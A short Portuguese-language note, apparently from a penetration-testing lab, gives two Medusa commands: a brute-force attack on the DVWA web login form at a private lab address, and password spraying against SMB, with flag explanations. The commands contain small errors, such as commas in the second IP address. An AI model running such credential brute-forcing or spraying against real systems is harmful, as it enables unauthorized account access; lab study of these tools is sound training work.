código MEDUSA utilizado para  automação e tentativas em web
medusa -h 192.168.56.102 -U users.txt -P pass.txt -m http \
-m PAGE:'dvwa\login.php'\
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6

Código MEDUSA ataques password spraying em SMB 
medusa -h 192,168,56,102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
-U e -P = nome da wordlist criada
-M(maiúsculo) = tipo de serviço
-t = quantidade de Threads
-T(maiúsculo) = limite de host paralelo
